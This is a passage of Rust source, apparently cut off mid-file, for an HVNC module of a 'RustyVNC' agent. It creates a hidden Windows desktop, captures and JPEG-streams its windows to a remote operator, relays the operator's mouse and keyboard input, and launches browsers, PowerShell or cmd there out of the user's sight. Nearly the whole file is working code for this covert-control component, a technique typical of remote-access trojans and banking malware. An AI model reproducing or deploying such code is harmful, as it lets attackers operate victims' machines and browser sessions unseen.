#![allow(dead_code, unused_assignments, unused_unsafe, unused_variables)]

/// HVNC (Hidden Virtual Network Computing) module for the RustyVNC client.
///
/// Creates an invisible Windows desktop, captures its screen via BitBlt,
/// compresses to JPEG via GDI+, and streams frames through the RustyVNC relay.
/// Operator mouse/keyboard input is relayed back via PostMessageW.
///
/// Windows-only. Non-Windows compiles to a stub that returns an error.

#[cfg(not(windows))]
pub use stub::*;

#[cfg(not(windows))]
mod stub {
    use crate::socks::{SocksOut, WakeSignal};
    use std::sync::{Arc, Mutex};
    use uuid::Uuid;

    pub struct HvncSession;

    impl HvncSession {
        pub fn start(
            _outbound: Arc<Mutex<Vec<SocksOut>>>,
            _wake: WakeSignal,
            _agent_id: Uuid,
            _quality: u8,
        ) -> Result<Self, String> {
            Err("HVNC not supported on this platform".into())
        }
        pub fn stop(self) {}
        pub fn handle_input(&self, _data: &[u8]) {}
        pub fn conn_id(&self) -> Uuid {
            Uuid::nil()
        }
    }
}

#[cfg(windows)]
pub use win::*;

#[cfg(windows)]
mod win {
    use std::ffi::c_void;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{mpsc, Arc, Mutex};
    use std::thread;

    use uuid::Uuid;

    use crate::socks::{SocksOut, WakeSignal};

    // ── Win32 constants ──────────────────────────────────────────────────────

    const SRCCOPY: u32 = 0x00CC0020;
    const DIB_RGB_COLORS: u32 = 0;
    const BI_RGB: u32 = 0;
    const GENERIC_ALL: u32 = 0x10000000;
    const SM_CXSCREEN: i32 = 0;
    const SM_CYSCREEN: i32 = 1;

    // Window messages
    const WM_LBUTTONDOWN: u32 = 0x0201;
    const WM_LBUTTONUP: u32 = 0x0202;
    const WM_RBUTTONDOWN: u32 = 0x0204;
    const WM_RBUTTONUP: u32 = 0x0205;
    const WM_MBUTTONDOWN: u32 = 0x0207;
    const WM_MBUTTONUP: u32 = 0x0208;
    const WM_LBUTTONDBLCLK: u32 = 0x0203;
    const WM_RBUTTONDBLCLK: u32 = 0x0206;
    const WM_MBUTTONDBLCLK: u32 = 0x0209;
    const WM_MOUSEMOVE: u32 = 0x0200;
    const WM_MOUSEWHEEL: u32 = 0x020A;
    const WM_KEYDOWN: u32 = 0x0100;
    const WM_KEYUP: u32 = 0x0101;
    const WM_CHAR: u32 = 0x0102;
    const WM_CLOSE: u32 = 0x0010;
    const WM_NCHITTEST: u32 = 0x0084;
    const WM_SYSCOMMAND: u32 = 0x0112;

    const HTCLOSE: i32 = 20;
    const HTMINBUTTON: i32 = 8;
    const HTMAXBUTTON: i32 = 9;
    const SC_MINIMIZE: usize = 0xF020;
    const SC_MAXIMIZE: usize = 0xF030;
    const SC_RESTORE: usize = 0xF120;
    const SW_SHOWMAXIMIZED: u32 = 3;

    // HVNC wire protocol markers
    const FRAME_JPEG: u8 = 0x01;
    const INPUT_MSG: u8 = 0x02;
    const CONTROL_MSG: u8 = 0x03;

    // Control actions
    const ACTION_EXPLORER: u32 = 1;
    const ACTION_RUN: u32 = 2;
    const ACTION_CHROME: u32 = 3;
    const ACTION_EDGE: u32 = 4;
    const ACTION_BRAVE: u32 = 5;
    const ACTION_FIREFOX: u32 = 6;
    const ACTION_POWERSHELL: u32 = 7;
    const ACTION_CMD: u32 = 8;

    // GDI+ constants
    const GDIP_OK: u32 = 0;
    const PIXEL_FORMAT_24BPP_RGB: i32 = 0x00021808;
    // JPEG CLSID: {557CF401-1A04-11D3-9A73-0000F81EF32E}
    const JPEG_CLSID: [u8; 16] = [
        0x01, 0xF4, 0x7C, 0x55, 0x04, 0x1A, 0xD3, 0x11, 0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3,
        0x2E,
    ];
    // Quality encoder GUID
    const ENCODER_QUALITY_GUID: [u8; 16] = [
        0xB5, 0xE4, 0x5B, 0x1D, 0x4A, 0xFA, 0x2D, 0x45, 0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7,
        0xEB,
    ];

    // ── Win32 FFI structs ────────────────────────────────────────────────────

    #[repr(C)]
    #[allow(non_snake_case)]
    struct BITMAPINFOHEADER {
        biSize: u32,
        biWidth: i32,
        biHeight: i32,
        biPlanes: u16,
        biBitCount: u16,
        biCompression: u32,
        biSizeImage: u32,
        biXPelsPerMeter: i32,
        biYPelsPerMeter: i32,
        biClrUsed: u32,
        biClrImportant: u32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER,
        bmiColors: [u32; 1],
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct RECT {
        left: i32,
        top: i32,
        right: i32,
        bottom: i32,
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    #[allow(non_snake_case)]
    struct POINT {
        x: i32,
        y: i32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct WINDOWPLACEMENT {
        length: u32,
        flags: u32,
        showCmd: u32,
        ptMinPosition: POINT,
        ptMaxPosition: POINT,
        rcNormalPosition: RECT,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct STARTUPINFOW {
        cb: u32,
        lpReserved: *mut u16,
        lpDesktop: *mut u16,
        lpTitle: *mut u16,
        dwX: u32,
        dwY: u32,
        dwXSize: u32,
        dwYSize: u32,
        dwXCountChars: u32,
        dwYCountChars: u32,
        dwFillAttribute: u32,
        dwFlags: u32,
        wShowWindow: u16,
        cbReserved2: u16,
        lpReserved2: *mut u8,
        hStdInput: *mut c_void,
        hStdOutput: *mut c_void,
        hStdError: *mut c_void,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct PROCESS_INFORMATION {
        hProcess: *mut c_void,
        hThread: *mut c_void,
        dwProcessId: u32,
        dwThreadId: u32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct GdiplusStartupInput {
        GdiplusVersion: u32,
        DebugEventCallback: *const c_void,
        SuppressBackgroundThread: i32,
        SuppressExternalCodecs: i32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct EncoderParameter {
        Guid: [u8; 16],
        NumberOfValues: u32,
        Type: u32,
        Value: *const c_void,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct EncoderParameters {
        Count: u32,
        Parameter: [EncoderParameter; 1],
    }

    // IStream COM vtable for reading JPEG output
    #[repr(C)]
    struct IStreamVtbl {
        query_interface: *const c_void,
        add_ref: *const c_void,
        release: unsafe extern "system" fn(this: *mut c_void) -> u32,
        read: unsafe extern "system" fn(
            this: *mut c_void,
            pv: *mut u8,
            cb: u32,
            pcb_read: *mut u32,
        ) -> i32,
        write: *const c_void,
        seek: unsafe extern "system" fn(
            this: *mut c_void,
            move_: i64,
            origin: u32,
            new_pos: *mut u64,
        ) -> i32,
        set_size: *const c_void,
        copy_to: *const c_void,
        commit: *const c_void,
        revert: *const c_void,
        lock_region: *const c_void,
        unlock_region: *const c_void,
        stat: unsafe extern "system" fn(this: *mut c_void, stat: *mut STATSTG, flag: u32) -> i32,
        clone: *const c_void,
    }

    #[repr(C)]
    struct IStream {
        vtbl: *const IStreamVtbl,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct STATSTG {
        pwcsName: *mut u16,
        r#type: u32,
        cbSize: u64,
        mtime: u64,
        ctime: u64,
        atime: u64,
        grfMode: u32,
        grfLocksSupported: u32,
        clsid: [u8; 16],
        grfStateBits: u32,
        reserved: u32,
    }

    // ── Win32 FFI declarations ───────────────────────────────────────────────

    extern "system" {
        // Desktop
        fn CreateDesktopW(
            name: *const u16,
            device: *const u16,
            devmode: *const c_void,
            flags: u32,
            access: u32,
            sa: *const c_void,
        ) -> *mut c_void;
        fn OpenDesktopW(name: *const u16, flags: u32, inherit: i32, access: u32) -> *mut c_void;
        fn SetThreadDesktop(desk: *mut c_void) -> i32;
        fn CloseDesktop(desk: *mut c_void) -> i32;
        fn GetThreadDesktop(thread_id: u32) -> *mut c_void;
        fn GetCurrentThreadId() -> u32;

        // GDI — fast path: BitBlt from desktop DC
        fn GetDC(hwnd: *mut c_void) -> *mut c_void;
        fn CreateCompatibleDC(hdc: *mut c_void) -> *mut c_void;
        fn CreateCompatibleBitmap(hdc: *mut c_void, cx: i32, cy: i32) -> *mut c_void;
        fn SelectObject(hdc: *mut c_void, obj: *mut c_void) -> *mut c_void;
        fn BitBlt(
            dest: *mut c_void,
            x: i32,
            y: i32,
            cx: i32,
            cy: i32,
            src: *mut c_void,
            srcx: i32,
            srcy: i32,
            rop: u32,
        ) -> i32;
        fn GetDIBits(
            hdc: *mut c_void,
            hbm: *mut c_void,
            start: u32,
            lines: u32,
            bits: *mut u8,
            bi: *mut BITMAPINFO,
            usage: u32,
        ) -> i32;
        fn DeleteDC(hdc: *mut c_void) -> i32;
        fn DeleteObject(obj: *mut c_void) -> i32;
        fn ReleaseDC(hwnd: *mut c_void, hdc: *mut c_void) -> i32;
        fn GetSystemMetrics(index: i32) -> i32;
        fn StretchBlt(
            dest: *mut c_void,
            dx: i32,
            dy: i32,
            dw: i32,
            dh: i32,
            src: *mut c_void,
            sx: i32,
            sy: i32,
            sw: i32,
            sh: i32,
            rop: u32,
        ) -> i32;
        fn SetStretchBltMode(hdc: *mut c_void, mode: i32) -> i32;

        // Window enumeration & capture
        fn EnumDesktopWindows(
            desktop: *mut c_void,
            callback: unsafe extern "system" fn(*mut c_void, isize) -> i32,
            lparam: isize,
        ) -> i32;
        fn IsWindowVisible(hwnd: *mut c_void) -> i32;
        fn GetWindowRect(hwnd: *mut c_void, rect: *mut RECT) -> i32;
        fn PrintWindow(hwnd: *mut c_void, hdc: *mut c_void, flags: u32) -> i32;
        fn GetTopWindow(hwnd: *mut c_void) -> *mut c_void;
        fn GetWindow(hwnd: *mut c_void, cmd: u32) -> *mut c_void;
        fn GetClientRect(hwnd: *mut c_void, rect: *mut RECT) -> i32;
        fn PatBlt(hdc: *mut c_void, x: i32, y: i32, w: i32, h: i32, rop: u32) -> i32;
        fn WindowFromPoint(point: POINT) -> *mut c_void;
        fn ChildWindowFromPoint(parent: *mut c_void, point: POINT) -> *mut c_void;
        fn ScreenToClient(hwnd: *mut c_void, point: *mut POINT) -> i32;
        fn GetDesktopWindow() -> *mut c_void;
        fn PostMessageW(hwnd: *mut c_void, msg: u32, wparam: usize, lparam: isize) -> i32;
        fn SendMessageW(hwnd: *mut c_void, msg: u32, wparam: usize, lparam: isize) -> isize;
        fn GetWindowPlacement(hwnd: *mut c_void, wndpl: *mut WINDOWPLACEMENT) -> i32;
        fn SetForegroundWindow(hwnd: *mut c_void) -> i32;
        fn SetFocus(hwnd: *mut c_void) -> *mut c_void;
        fn GetFocus() -> *mut c_void;
        fn GetKeyboardState(state: *mut u8) -> i32;
        fn SetKeyboardState(state: *const u8) -> i32;
        fn BringWindowToTop(hwnd: *mut c_void) -> i32;
        fn GetWindowLongW(hwnd: *mut c_void, index: i32) -> i32;
        fn SetWindowLongW(hwnd: *mut c_void, index: i32, new_long: i32) -> i32;
        fn FindWindowW(class: *const u16, window: *const u16) -> *mut c_void;
        fn FindWindowExW(
            parent: *mut c_void,
            child_after: *mut c_void,
            class: *const u16,
            window: *const u16,
        ) -> *mut c_void;
        fn GetClassNameW(hwnd: *mut c_void, buf: *mut u16, max: i32) -> i32;
        fn GetParent(hwnd: *mut c_void) -> *mut c_void;
        fn GetWindowThreadProcessId(hwnd: *mut c_void, pid: *mut u32) -> u32;
        fn AttachThreadInput(attach: u32, attach_to: u32, attach: i32) -> i32;
        fn InvalidateRect(hwnd: *mut c_void, rect: *const RECT, erase: i32) -> i32;
        fn UpdateWindow(hwnd: *mut c_void) -> i32;
        fn RedrawWindow(hwnd: *mut c_void, rect: *const RECT, rgn: *mut c_void, flags: u32) -> i32;
        fn EnumChildWindows(
            parent: *mut c_void,
            callback: unsafe extern "system" fn(*mut c_void, isize) -> i32,
            lparam: isize,
        ) -> i32;

        // Process
        fn CreateProcessW(
            app: *const u16,
            cmd: *mut u16,
            proc_sa: *const c_void,
            thread_sa: *const c_void,
            inherit: i32,
            flags: u32,
            env: *const c_void,
            dir: *const u16,
            si: *const STARTUPINFOW,
            pi: *mut PROCESS_INFORMATION,
        ) -> i32;
        fn CloseHandle(handle: *mut c_void) -> i32;
        fn GetCurrentProcessId() -> u32;
        fn ProcessIdToSessionId(pid: u32, session_id: *mut u32) -> i32;

        // Cross-process memory (for reading ListView items in explorer.exe)
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn VirtualAllocEx(
            proc: *mut c_void,
            addr: *const c_void,
            size: usize,
            alloc_type: u32,
            protect: u32,
        ) -> *mut c_void;
        fn VirtualFreeEx(proc: *mut c_void, addr: *mut c_void, size: usize, free_type: u32) -> i32;
        fn WriteProcessMemory(
            proc: *mut c_void,
            base: *mut c_void,
            buf: *const c_void,
            size: usize,
            written: *mut usize,
        ) -> i32;
        fn ReadProcessMemory(
            proc: *mut c_void,
            base: *const c_void,
            buf: *mut c_void,
            size: usize,
            read: *mut usize,
        ) -> i32;

        // Shell
        fn ShellExecuteW(
            hwnd: *mut c_void,
            verb: *const u16,
            file: *const u16,
            params: *const u16,
            dir: *const u16,
            show_cmd: i32,
        ) -> *mut c_void;

        // GDI+
        fn GdiplusStartup(
            token: *mut usize,
            input: *const GdiplusStartupInput,
            output: *mut c_void,
        ) -> u32;
        fn GdipCreateBitmapFromScan0(
            w: i32,
            h: i32,
            stride: i32,
            format: i32,
            scan0: *const u8,
            bmp: *mut *mut c_void,
        ) -> u32;
        fn GdipSaveImageToStream(
            image: *mut c_void,
            stream: *mut c_void,
            clsid: *const [u8; 16],
            params: *const EncoderParameters,
        ) -> u32;
        fn GdipDisposeImage(image: *mut c_void) -> u32;

        // COM stream
        fn CreateStreamOnHGlobal(
            hglobal: *mut c_void,
            delete_on_release: i32,
            stream: *mut *mut c_void,
        ) -> i32;
        fn Sleep(ms: u32);
        fn GetEnvironmentVariableW(name: *const u16, buf: *mut u16, size: u32) -> u32;

        // Filesystem
        fn GetFileAttributesW(path: *const u16) -> u32;
        fn WaitForSingleObject(handle: *mut c_void, ms: u32) -> u32;
        fn CreateEventW(
            attr: *const c_void,
            manual_reset: i32,
            initial: i32,
            name: *const u16,
        ) -> *mut c_void;
        fn SetEvent(handle: *mut c_void) -> i32;

        // Shell — taskbar setup
        fn SHAppBarMessage(msg: u32, data: *mut APPBARDATA) -> usize;

        // Synthesized hardware input
        fn SendInput(count: u32, inputs: *const INPUT_EVENT, size: i32) -> u32;
        fn SetCursorPos(x: i32, y: i32) -> i32;
        fn MapVirtualKeyW(code: u32, map_type: u32) -> u32;
    }

    // SendInput constants
    const INPUT_MOUSE: u32 = 0;
    const INPUT_KEYBOARD: u32 = 1;
    const MOUSEEVENTF_MOVE: u32 = 0x0001;
    const MOUSEEVENTF_LEFTDOWN: u32 = 0x0002;
    const MOUSEEVENTF_LEFTUP: u32 = 0x0004;
    const MOUSEEVENTF_RIGHTDOWN: u32 = 0x0008;
    const MOUSEEVENTF_RIGHTUP: u32 = 0x0010;
    const MOUSEEVENTF_MIDDLEDOWN: u32 = 0x0020;
    const MOUSEEVENTF_MIDDLEUP: u32 = 0x0040;
    const MOUSEEVENTF_WHEEL: u32 = 0x0800;
    const MOUSEEVENTF_ABSOLUTE: u32 = 0x8000;
    const KEYEVENTF_KEYUP: u32 = 0x0002;
    const KEYEVENTF_UNICODE: u32 = 0x0004;

    #[repr(C)]
    #[derive(Copy, Clone)]
    struct INPUT_EVENT {
        r#type: u32,
        data: INPUT_UNION,
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    union INPUT_UNION {
        mi: MOUSEINPUT,
        ki: KEYBDINPUT,
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    #[allow(non_snake_case)]
    struct MOUSEINPUT {
        dx: i32,
        dy: i32,
        mouseData: u32,
        dwFlags: u32,
        time: u32,
        dwExtraInfo: usize,
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    #[allow(non_snake_case)]
    struct KEYBDINPUT {
        wVk: u16,
        wScan: u16,
        dwFlags: u32,
        time: u32,
        dwExtraInfo: usize,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct APPBARDATA {
        cbSize: u32,
        hWnd: *mut c_void,
        uCallbackMessage: u32,
        uEdge: u32,
        rc: RECT,
        lParam: isize,
    }

    /// Verify that SetThreadDesktop succeeded by checking GetThreadDesktop matches.
    /// Retries up to 10 times with 50ms delay. Returns true on success.
    unsafe fn verify_set_thread_desktop(desk_ptr: usize) -> bool {
        let tid = GetCurrentThreadId();
        for attempt in 0..10 {
            SetThreadDesktop(desk_ptr as *mut c_void);
            let current = GetThreadDesktop(tid);
            if current == desk_ptr as *mut c_void {
                return true;
            }
            if attempt < 9 {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
        }
        eprintln!("[hvnc] FATAL: SetThreadDesktop failed after 10 attempts");
        false
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    fn to_wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn current_process_session_id() -> Option<u32> {
        unsafe {
            let mut session_id = 0u32;
            let ok = ProcessIdToSessionId(GetCurrentProcessId(), &mut session_id);
            if ok == 0 {
                None
            } else {
                Some(session_id)
            }
        }
    }

    // ── GDI+ JPEG encoding ──────────────────────────────────────────────────

    fn gdip_init() -> bool {
        static INIT: std::sync::Once = std::sync::Once::new();
        static mut OK: bool = false;
        INIT.call_once(|| unsafe {
            let input = GdiplusStartupInput {
                GdiplusVersion: 1,
                DebugEventCallback: std::ptr::null(),
                SuppressBackgroundThread: 0,
                SuppressExternalCodecs: 0,
            };
            let mut token: usize = 0;
            OK = GdiplusStartup(&mut token, &input, std::ptr::null_mut()) == GDIP_OK;
        });
        unsafe { OK }
    }

    /// Encode 24bpp BGR pixels (bottom-up from GetDIBits) to JPEG.
    /// Uses a pre-allocated flip buffer to avoid allocation per frame.
    fn encode_jpeg(
        pixels: &[u8],
        flip_buf: &mut Vec<u8>,
        width: i32,
        height: i32,
        quality: u8,
    ) -> Option<Vec<u8>> {
        if !gdip_init() {
            return None;
        }
        unsafe {
            let stride = ((width * 3 + 3) / 4) * 4;
            let row_bytes = (width * 3) as usize;
            let pad = (stride - width * 3) as usize;

            // Flip bottom-up → top-down into pre-allocated buffer
            flip_buf.clear();
            flip_buf.reserve(pixels.len());
            for row in (0..height).rev() {
                let start = (row * stride) as usize;
                let end = start + row_bytes;
                if end <= pixels.len() {
                    flip_buf.extend_from_slice(&pixels[start..end]);
                    // Pad row to stride alignment
                    for _ in 0..pad {
                        flip_buf.push(0);
                    }
                }
            }

            let mut bmp: *mut c_void = std::ptr::null_mut();
            if GdipCreateBitmapFromScan0(
                width,
                height,
                stride,
                PIXEL_FORMAT_24BPP_RGB,
                flip_buf.as_ptr(),
                &mut bmp,
            ) != GDIP_OK
                || bmp.is_null()
            {
                return None;
            }

            let mut stream: *mut c_void = std::ptr::null_mut();
            if CreateStreamOnHGlobal(std::ptr::null_mut(), 1, &mut stream) < 0 || stream.is_null() {
                GdipDisposeImage(bmp);
                return None;
            }

            let quality_val: u32 = quality as u32;
            let params = EncoderParameters {
                Count: 1,
                Parameter: [EncoderParameter {
                    Guid: ENCODER_QUALITY_GUID,
                    NumberOfValues: 1,
                    Type: 4, // EncoderParameterValueTypeLong
                    Value: &quality_val as *const u32 as *const c_void,
                }],
            };

            let ok = GdipSaveImageToStream(bmp, stream, &JPEG_CLSID, &params);
            GdipDisposeImage(bmp);

            if ok != GDIP_OK {
                let vtbl = &*(*(stream as *const IStream)).vtbl;
                (vtbl.release)(stream);
                return None;
            }

            let vtbl = &*(*(stream as *const IStream)).vtbl;
            let mut stat = std::mem::zeroed::<STATSTG>();
            (vtbl.stat)(stream, &mut stat, 1);
            let size = stat.cbSize as usize;
            (vtbl.seek)(stream, 0, 0, std::ptr::null_mut());

            let mut jpeg_data = vec![0u8; size];
            let mut read: u32 = 0;
            (vtbl.read)(stream, jpeg_data.as_mut_ptr(), size as u32, &mut read);
            jpeg_data.truncate(read as usize);
            (vtbl.release)(stream);

            Some(jpeg_data)
        }
    }

    // ── Fast desktop capture via BitBlt ──────────────────────────────────────

    /// Max visible windows to capture per frame (skip background clutter)
    const MAX_CAPTURE_WINDOWS: usize = 8;

    /// Persistent GDI resources for the capture thread — allocated once, reused every frame.
    struct CaptureCtx {
        hdc_screen: *mut c_void, // Screen DC
        hdc_mem: *mut c_void,    // Memory DC for capture
        hbm: *mut c_void,        // Bitmap for capture
        hdc_scaled: *mut c_void, // Memory DC for scaled output (may be null if no scaling)
        hbm_scaled: *mut c_void, // Bitmap for scaled output
        // Pooled temp resources for per-window PrintWindow (avoids alloc/free per window per frame)
        tmp_dc: *mut c_void,
        tmp_bmp: *mut c_void,
        tmp_w: i32,
        tmp_h: i32,
        desk_w: i32,
        desk_h: i32,
        out_w: i32,
        out_h: i32,
        pixel_buf: Vec<u8>, // Reused pixel buffer
        flip_buf: Vec<u8>,  // Reused flip buffer for JPEG encoding
        bi: BITMAPINFO,     // Reused BITMAPINFO
    }

    /// EnumChildWindows callback: force each child to repaint.
    /// Critical for Explorer — content lives in nested DirectUI/ShellTabWindowClass children.
    unsafe extern "system" fn redraw_child_callback(hwnd: *mut c_void, _lparam: isize) -> i32 {
        const RDW_INVALIDATE: u32 = 0x0001;
        const RDW_UPDATENOW: u32 = 0x0100;
        RedrawWindow(
            hwnd,
            std::ptr::null(),
            std::ptr::null_mut(),
            RDW_INVALIDATE | RDW_UPDATENOW,
        );
        UpdateWindow(hwnd);
        1 // continue enumeration
    }

    impl CaptureCtx {
        unsafe fn new(target_w: i32, target_h: i32) -> Option<Self> {
            let hdc_screen = GetDC(std::ptr::null_mut());
            if hdc_screen.is_null() {
                return None;
            }

            let desk_w = GetSystemMetrics(SM_CXSCREEN);
            let desk_h = GetSystemMetrics(SM_CYSCREEN);
            if desk_w <= 0 || desk_h <= 0 {
                ReleaseDC(std::ptr::null_mut(), hdc_screen);
                return None;
            }

            let hdc_mem = CreateCompatibleDC(hdc_screen);
            let hbm = CreateCompatibleBitmap(hdc_screen, desk_w, desk_h);
            SelectObject(hdc_mem, hbm);

            let out_w = target_w.min(desk_w);
            let out_h = target_h.min(desk_h);
            let needs_scale = out_w != desk_w || out_h != desk_h;

            let (hdc_scaled, hbm_scaled) = if needs_scale {
                let hdc_s = CreateCompatibleDC(hdc_screen);
                let hbm_s = CreateCompatibleBitmap(hdc_screen, out_w, out_h);
                SelectObject(hdc_s, hbm_s);
                SetStretchBltMode(hdc_s, 4); // HALFTONE
                (hdc_s, hbm_s)
            } else {
                (std::ptr::null_mut(), std::ptr::null_mut())
            };

            let stride = ((out_w * 3 + 3) / 4) * 4;
            let pixel_size = (stride * out_h) as usize;

            let bi = BITMAPINFO {
                bmiHeader: BITMAPINFOHEADER {
                    biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                    biWidth: out_w,
                    biHeight: out_h,
                    biPlanes: 1,
                    biBitCount: 24,
                    biCompression: BI_RGB,
                    biSizeImage: pixel_size as u32,
                    biXPelsPerMeter: 0,
                    biYPelsPerMeter: 0,
                    biClrUsed: 0,
                    biClrImportant: 0,
                },
                bmiColors: [0],
            };

            // Pre-allocate pooled temp DC for PrintWindow (reused across frames)
            let tmp_dc = CreateCompatibleDC(hdc_screen);

            Some(CaptureCtx {
                hdc_screen,
                hdc_mem,
                hbm,
                hdc_scaled,
                hbm_scaled,
                tmp_dc,
                tmp_bmp: std::ptr::null_mut(),
                tmp_w: 0,
                tmp_h: 0,
                desk_w,
                desk_h,
                out_w,
                out_h,
                pixel_buf: vec![0u8; pixel_size],
                flip_buf: Vec::with_capacity(pixel_size),
                bi,
            })
        }

        /// Capture one frame via PrintWindow compositing.
        /// Hidden desktops don't have DWM composition so BitBlt from screen DC
        /// always produces black — PrintWindow is the only way.
        /// Returns true if pixels changed (via CRC32 hash) OR force_repaint is set.
        unsafe fn capture(&mut self, prev_hash: &mut u32, force_repaint: bool) -> bool {
            const GW_HWNDLAST: u32 = 1;
            const GW_HWNDPREV: u32 = 3;
            const BLACKNESS: u32 = 0x00000042;
            // RedrawWindow flags
            const RDW_INVALIDATE: u32 = 0x0001;
            const RDW_UPDATENOW: u32 = 0x0100;
            const RDW_ALLCHILDREN: u32 = 0x0080;
            const RDW_FLAGS: u32 = RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN;

            PatBlt(self.hdc_mem, 0, 0, self.desk_w, self.desk_h, BLACKNESS);

            let top = GetTopWindow(std::ptr::null_mut());
            if !top.is_null() {
                // Collect visible windows (bottom-to-top for painter's algorithm)
                let mut windows: [*mut c_void; 16] = [std::ptr::null_mut(); 16];
                let mut win_count = 0usize;
                let mut hwnd = GetWindow(top, GW_HWNDLAST);
                while !hwnd.is_null() && win_count < MAX_CAPTURE_WINDOWS {
                    if IsWindowVisible(hwnd) != 0 {
                        windows[win_count] = hwnd;
                        win_count += 1;
                    }
                    hwnd = GetWindow(hwnd, GW_HWNDPREV);
                }

                // Paint collected windows
                for i in 0..win_count {
                    let wnd = windows[i];
                    let mut wr: RECT = std::mem::zeroed();
                    if GetWindowRect(wnd, &mut wr) == 0 {
                        continue;
                    }
                    let w = wr.right - wr.left;
                    let h = wr.bottom - wr.top;
                    if w <= 0 || h <= 0 || self.tmp_dc.is_null() {
                        continue;
                    }

                    let cls = get_class_name(wnd);
                    let is_desktop_bg = cls == "Progman" || cls == "WorkerW";

                    // Force repaint on non-desktop windows (explorer, apps)
                    // Desktop background (Progman/WorkerW) doesn't need forced repaint
                    if !is_desktop_bg {
                        RedrawWindow(wnd, std::ptr::null(), std::ptr::null_mut(), RDW_FLAGS);
                        // Force child windows to repaint too (DirectUI, ShellTabWindowClass etc.)
                        EnumChildWindows(wnd, redraw_child_callback, 0);
                    }

                    // Resize pooled bitmap only when needed
                    if w > self.tmp_w || h > self.tmp_h {
                        if !self.tmp_bmp.is_null() {
                            DeleteObject(self.tmp_bmp);
                        }
                        let new_w = w.max(self.tmp_w);
                        let new_h = h.max(self.tmp_h);
                        self.tmp_bmp = CreateCompatibleBitmap(self.hdc_screen, new_w, new_h);
                        self.tmp_w = new_w;
                        self.tmp_h = new_h;
                    }
                    if self.tmp_bmp.is_null() {
                        continue;
                    }

                    let old = SelectObject(self.tmp_dc, self.tmp_bmp);
                    // PW_RENDERFULLCONTENT (2) for app windows; flag 0 for desktop bg
                    let pw_flag = if is_desktop_bg { 0u32 } else { 2u32 };
                    let pw_ok = PrintWindow(wnd, self.tmp_dc, pw_flag);
                    if pw_ok == 0 && !is_desktop_bg {
                        PrintWindow(wnd, self.tmp_dc, 0);
                    }
                    BitBlt(
                        self.hdc_mem,
                        wr.left,
                        wr.top,
                        w,
                        h,
                        self.tmp_dc,
                        0,
                        0,
                        SRCCOPY,
                    );
                    SelectObject(self.tmp_dc, old);
                }
            }

            // Scale if needed
            let (final_hdc, final_hbm) = if !self.hdc_scaled.is_null() {
                StretchBlt(
                    self.hdc_scaled,
                    0,
                    0,
                    self.out_w,
                    self.out_h,
                    self.hdc_mem,
                    0,
                    0,
                    self.desk_w,
                    self.desk_h,
                    SRCCOPY,
                );
                (self.hdc_scaled, self.hbm_scaled)
            } else {
                (self.hdc_mem, self.hbm)
            };

            // Extract pixels
            let lines = GetDIBits(
                final_hdc,
                final_hbm,
                0,
                self.out_h as u32,
                self.pixel_buf.as_mut_ptr(),
                &mut self.bi,
                DIB_RGB_COLORS,
            );
            if lines == 0 {
                return false;
            }

            let hash = crc32_fast(&self.pixel_buf);
            if hash == *prev_hash {
                // After input burst, send frame even if unchanged so frontend gets feedback
                if force_repaint {
                    return true;
                }
                return false;
            }
            *prev_hash = hash;
            true
        }

        unsafe fn cleanup(&mut self) {
            if !self.tmp_bmp.is_null() {
                DeleteObject(self.tmp_bmp);
            }
            if !self.tmp_dc.is_null() {
                DeleteDC(self.tmp_dc);
            }
            if !self.hbm_scaled.is_null() {
                DeleteObject(self.hbm_scaled);
            }
            if !self.hdc_scaled.is_null() {
                DeleteDC(self.hdc_scaled);
            }
            DeleteObject(self.hbm);
            DeleteDC(self.hdc_mem);
            ReleaseDC(std::ptr::null_mut(), self.hdc_screen);
        }
    }

    /// Fast CRC32 hash for change detection. Not cryptographic, just fast comparison.
    fn crc32_fast(data: &[u8]) -> u32 {
        // Sample every 64th byte for speed — 1920*1080*3 / 64 ≈ 97K comparisons
        // This catches any meaningful visual change while being ~64x faster than full compare
        let mut hash: u32 = 0xFFFFFFFF;
        let mut i = 0;
        while i < data.len() {
            hash ^= data[i] as u32;
            hash = hash.wrapping_mul(0x01000193); // FNV prime
            i += 64;
        }
        hash
    }

    // ── Process launching on hidden desktop ──────────────────────────────────

    const CREATE_NEW_CONSOLE: u32 = 0x00000010;

    unsafe fn launch_on_desktop(desktop_name: &[u16], cmd: &str) {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.lpDesktop = desktop_name.as_ptr() as *mut u16;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let mut cmd_wide = to_wide(cmd);
        let ok = CreateProcessW(
            std::ptr::null(),
            cmd_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_NEW_CONSOLE,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        );
        crate::dbg_print!("[hvnc] launch_on_desktop: cmd={} ok={}", cmd, ok);
        if !pi.hProcess.is_null() {
            CloseHandle(pi.hProcess);
        }
        if !pi.hThread.is_null() {
            CloseHandle(pi.hThread);
        }
    }

    /// Copy a directory using robocopy (best-effort, blocking up to 30s).
